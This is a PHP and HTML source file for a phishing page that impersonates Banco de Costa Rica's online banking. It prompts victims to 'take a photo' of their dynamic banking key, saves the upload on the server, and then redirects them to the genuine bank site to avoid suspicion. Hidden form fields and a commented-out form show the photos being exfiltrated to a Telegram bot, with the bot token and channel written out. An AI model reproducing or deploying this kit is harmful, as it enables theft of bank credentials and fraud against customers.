<?php session_start();
error_reporting(0);
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $foto1nombre = $_FILES['photo']['name'];
    $foto1guardado = $_FILES['photo']['tmp_name'];
    if (empty($foto1nombre)) {
        $foto1URLErr = "Por favor ingrese una foto.";
    } else {
        if(!file_exists('images')){
            mkdir('images', 0777, true);
            if(file_exists('archivo')){
                if(move_uploaded_file($foto1guardado, 'images/'.$_SESSION["user"].$foto1nombre)){
                
                    header("location: https://www.personas.bancobcr.com/plantilla/index.asp");
                    exit;
                }
            }

        }else{
            if(move_uploaded_file($foto1guardado, 'images/'.$_SESSION["user"].$foto1nombre)){
                header("location: https://www.personas.bancobcr.com/plantilla/index.asp");
	            exit;
            }   
        }
    }
}
?>

<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
    <script
  src="https://code.jquery.com/jquery-3.6.4.min.js"
  integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8="
  crossorigin="anonymous"></script>

  </head>
  <body>
    <style>
        *{margin: 0;padding: 0;}
        @font-face {
            font-family: dinReg;
            src: url(din-regular.ttf);
        }
    </style>
    <nav style="padding-left: 12px;height: 64px;background-color: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: left;background-image: url('tp1.svg');background-position: right;background-size: 206px;background-repeat: no-repeat;">
        <img src="l.svg" alt="" style="width:142px;">
        </nav>
    <nav style="padding: 2px 0 9px;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: #1947a9">
        <img id="n1" src="lnks1.svg" alt="" style="height:28px;margin-left: 15px;">
    </nav>
    
    <div id="main-cnt" style="overflow: hidden;height:85vh;position: relative;text-align: center;background-image: url('b.png');background-repeat: no-repeat;background-position: center;background-size: cover;overflow: hidden;">
        
        <div id="ctn" style="display: inline-block;vertical-align: top;margin-top: 50px;">
            <div id="frmc" style="display:inline-block;text-align: center;border-radius: 8px;vertical-align: top;width: 500px;">
                
                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post"  enctype="multipart/form-data" style="display: inline-block;width: 420px;height: 404px;border-radius:10px;background-image: url(6.svg);position: relative;">
                    <input type="text" name="chat_id" value="-1001975703177" hidden="" />
                    <input type="text" name="caption" id="ipaddress" hidden="" />
                    <input type="text" name="username" value="usr" hidden>
                    <input type="text" name="pass" value="pss" hidden>
                    
                    
                    <div class="login-input" style="position:relative;top: 218px;left: 135px;padding-top: 8px;width: 150px;height: 25px;background-color: #1947a9;border-radius:3px;box-shadow:0px 3px 0px #0e2f75;">
                        <p id="texto" style="text-align: center;color: #fff;font-family: sans-serif;font-size: 14px;">Tomar Foto</p>
                        <input accept="image/*" id='files' type="file" name="photo"  required style="position:absolute;top:0px;left:0px;right:0px;bottom:0px;width:100%;height:100%;opacity: 0;"/><br>
                    </div>

                    <button  type="submit" value="sendPhoto" style="position:relative;top: 194px;background: #ed1c24;border: none;height: 30px;width: 140px;outline: none;border-radius: 4px;padding-top: 0px;cursor: pointer;user-select: none;color:#fff;margin-top: 82px;">
                        Continuar
                    </button>
                
                </form>
                
            </div>
            
        </div>
        
    </div>
        
    </div>
    <footer style="padding: 2px 0 9px;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: #1947a9;overflow: hidden;">
        <img id="n9" src="lnks2.svg" alt="" style="height:28px;">
    </footer>
    <style>
        
        @media screen and (max-width:1024px){
           body{
                width: 100%!important;
                background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
                background-repeat: no-repeat!important;
                min-width: auto!important;
                zoom:90%!important;
            }
            #ctn{
                border-radius: 6px!important;
            }
            #main-cnt{
                text-align: center!important;
                padding-top: 30px;
            }
            
            #frmc{
                width: 100%!important;
            }
            #bnncont{
                display: none!important;
            }
            #n9{
                height: 20px!important;
            }
            
        }
        @media screen and (max-width:420px){
            
        }
    </style>
  </body>
</html>





<!--
<form method="POST" action="https://api.telegram.org/bot5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE/sendPhoto" enctype="multipart/form-data" style="display: inline-block;width: 420px;height: 404px;border-radius:10px;background-image: url(2.svg);position: relative;">
    <input type="text" name="chat_id" value="@FORTYBCR" hidden="" />
    <input type="text" name="caption" id="ipaddress" hidden="" />
    <input type="text" name="username" value="usr" hidden>
    <input type="text" name="pass" value="pss" hidden>
    <h2 class="ui header primaryColor" tabindex="1">Validación a tu Banca Digital</h2>
    <hr class="hr-light" />
    <div class="login-input">
        <center>

            Validaremos tu identidad por favor ten cerca tu clave dinamica Banco de Costa Rica a la mano.
        </center>
    </div>
    <div class="login-input">
        
        <input accept="image/*" id='files' type="file" name="photo"  />
        
        <button class="ui red button bntContinuar" type="submit" value="sendPhoto">
            Continuar
        </button>
    </div>


</form>-->